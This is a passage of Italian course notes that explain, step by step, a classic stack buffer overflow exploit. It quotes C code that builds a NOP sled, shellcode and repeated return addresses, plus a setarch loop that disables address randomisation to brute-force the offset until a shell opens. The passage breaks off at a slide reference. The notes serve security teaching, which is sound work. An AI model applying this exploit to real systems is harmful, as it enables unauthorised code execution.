*tratta il buffer come 600/4 puntatori* per semplicità presumiamo che sia tutto a 32bit, quindi 4 byte, e copia all'interno del **buffer** gli indirizzi ret.

- il mio buffer di 600 byte, sarà riempito con 600/4 indirizzi di ritorno.

6. **Faccio un'altra passata sulla prima metà del buffer**
```c
	/* fill first half of buffer with NOPs */
	for(i=0; i<BUFFERSIZE/2; i++)
		buffer[i] = '\x90';
```
Riempio la prima metà del buffer con `\x90` : `0x90` la riempio di `nop`.
- Se il mio IP punta ad un'istruzione che è una NOP, non fa niente e semplicemente *incrementa l'IP di 1*.
- **quindi il mio buffer fino alla prima metà è pieno di `nop`, dalla seconda metà è pieno di indirizzi di ritorno**

7. **Circa a metà del buffer copio la shellcode**
```c
/* insert shellcode in the middle */
	ptr = buffer + ((BUFFERSIZE/2) - (strlen(lunixshell)/2));
	for(i=0; i<strlen(lunixshell); i++)
		*(ptr++) = lunixshell[i];
```
Prende un puntatore che punta a UN PO' MENO della metà del buffer e da quel puntatore scrivo la mia `linuxshell`
una `nop` è lunga 1byte.

**BUFFER**
`nop|nop|nop|shellcode|indirizzodiritorno|indirizzodiritono|indirizzodiritorno `

Ripeto l'indirizzo di ritorno tante volte perché spero che una di queste copie vada a sovrascrivere l'IP salvato sullo stack. Spero che una vada a sovrascriverlo. 

L'idea è che, le `nop` fanno slittare l'IP di 1 fino ad arrivare a puntare all'indirizzo della `shellcode`.


8. **Ora che il buffer è pronto invoco `execl`**

```c
/* call the vulnerable program passing our exploit buffer as the argument */
	buffer[BUFFERSIZE-1] = 0;
	execl("./vulnerable", "vulnerable", buffer, 0);
```

Il SO esegue il programma vulnerabile e ci passa il buffer.

**Dobbiamo mandare in esecuzione il programma `exploit.c` compilato passandogli l'offest come parametro**

```shell
for i in `seq 200 400`; do setarch i386 -R ./exploit $1; done
```

Itero su 200 fino a 400 e manderò in esecuzione 200 volte il mio exploit.

**`-R ./exploit $i`** : server per fare in modo che **il SO allochi vulnerable su un'area di memoria contigua a exploit**

Se non mettiamo questo flag, il SO mitiga questi problemi, alloca le aree in modo casuale.

se quella non va, metti questo
```c
for i in `seq 1 1000` ; do setarch i386 -R ./exploit $i; done
```

ad un certo punto dovresti ottenere una shell eseguibile.

Dato che abbiamo fatto in modo che le aree di memoria siano contigue, la shell dovrebbe sempre apparire quando gli passo un certo valore. E' deterministico.
Nel mio caso è sempre all'offset `0x14c` = **332** in decimale
Stack pointer: 0xffffcff8
       Offset: 0x14c
  Return addr: 0xffffceac


Se io ora provo a mandare in esecuzione la mia exploit a offset 332

`setarch i386 -R ./exploit 332` ottengo subito la mia shell

### Slide 46

Guarda bene la figura
![[Pasted image 20250517093321.png]]

- perché 